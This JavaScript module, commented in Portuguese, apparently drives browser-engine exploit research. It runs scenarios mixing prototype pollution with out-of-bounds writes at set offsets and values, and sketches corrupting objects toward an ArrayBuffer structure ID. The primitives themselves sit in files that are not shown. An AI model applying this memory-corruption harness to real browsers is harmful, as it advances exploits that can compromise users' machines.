// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

// Importamos a função modificada que permitirá mais controle
import { runSpecificJsonTypeConfusionTest } from './testJsonTypeConfusionUAFSpeculative.mjs';
// ... (outras importações)
import { KNOWN_STRUCTURE_IDS } from '../config.mjs';


// Nova função para executar cenários de teste de confusão de tipos isolados
async function runAllIsolatedJsonTCTests() {
    const FNAME_ISOLATED_RUNNER = "runAllIsolatedJsonTCTests";
    logS3("==== INICIANDO BATERIA DE TESTES ISOLADOS: JSON Type Confusion (S3) ====", 'test', FNAME_ISOLATED_RUNNER);

    // Cenário 1: Apenas Poluição de Protótipo (sem setup OOB e sem escrita OOB)
    await runSpecificJsonTypeConfusionTest(
        "OnlyPP_NoOOBSetup",    // description
        -1,                     // corruptionOffset (inválido para não escrever)
        0,                      // valueToWrite (irrelevante)
        true,                   // enablePP
        false,                  // attemptOOBWrite
        true                    // skipOOBEnvironmentSetup <--- PULA triggerOOB_primitive
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 2: Poluição de Protótipo COM setup OOB (mas sem escrita OOB)
    // (Similar ao seu log IMG_20250520_115243.jpg)
    await runSpecificJsonTypeConfusionTest(
        "OnlyPP_WithOOBSetup",  // description
        -1,                     // corruptionOffset (inválido para não escrever)
        0,                      // valueToWrite (irrelevante)
        true,                   // enablePP
        false,                  // attemptOOBWrite
        false                   // skipOOBEnvironmentSetup <--- FAZ triggerOOB_primitive
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 3: Apenas Escrita OOB (sem poluição de protótipo)
    await runSpecificJsonTypeConfusionTest(
        "OnlyOOBWrite_0x70_FFFFFFFF", // description
        0x70,                         // corruptionOffset
        0xFFFFFFFF,                   // valueToWrite
        false,                        // enablePP <--- PP Desabilitada
        true,                         // attemptOOBWrite
        false                         // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 4: Caso Original do Crash (PP Habilitada, Escrita OOB em 0x70 com 0xFFFFFFFF)
    await runSpecificJsonTypeConfusionTest(
        "OriginalCrash_0x70_FFFFFFFF_PP", // description
        0x70,                             // corruptionOffset
        0xFFFFFFFF,                       // valueToWrite
        true,                             // enablePP
        true,                             // attemptOOBWrite
        false                             // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 5: Variação de Valor (PP Habilitada, Escrita OOB em 0x70 com 0x0)
    await runSpecificJsonTypeConfusionTest(
        "Variant_0x70_0_PP",              // description
        0x70,                             // corruptionOffset
        0x0,                              // valueToWrite
        true,                             // enablePP
        true,                             // attemptOOBWrite
        false                             // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Cenário 6: Variação de Offset (PP Habilitada, Escrita OOB em 0x6C com 0xFFFFFFFF)
    await runSpecificJsonTypeConfusionTest(
        "Variant_0x6C_FFFFFFFF_PP",       // description
        0x6C,                             // corruptionOffset
        0xFFFFFFFF,                       // valueToWrite
        true,                             // enablePP
        true,                             // attemptOOBWrite
        false                             // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Adicione mais chamadas a runSpecificJsonTypeConfusionTest aqui com outras combinações
    // Ex: Usando um StructureID candidato (lembre-se de converter para número)
    // const idArrayBuffer = parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16);
    // if (!isNaN(idArrayBuffer)) {
    //    await runSpecificJsonTypeConfusionTest(
    //        `CorruptToTypeArrayBuffer_0x70_PP`,
    //        0x70,
    //        idArrayBuffer,
    //        true,
    //        true,
    //        false
    //    );
    //    await PAUSE_S3(MEDIUM_PAUSE_S3);
    // }


    logS3("==== BATERIA DE TESTES ISOLADOS: JSON Type Confusion (S3) CONCLUÍDA ====", 'test', FNAME_ISOLATED_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_Modular';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3("==== INICIANDO Script 3: Testes Avançados Isolados (Foco em JSON TC) ====", 'test', FNAME);
    
    await runAllIsolatedJsonTCTests(); // <<< EXECUTA A BATERIA DE TESTES ISOLADOS

    // Comente ou descomente os testes abaixo conforme necessário
    // await testWebAssemblyInterface();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // await testSharedArrayBufferSupport();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // explainMemoryPrimitives();
    // await PAUSE_S3(SHORT_PAUSE_S3);
    // await testCorruptArrayBufferStructure();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // await testCoreExploitModule(logS3); 
    // await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3("\n==== Script 3 CONCLUÍDO (Foco em Testes Avançados Isolados) ====", 'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
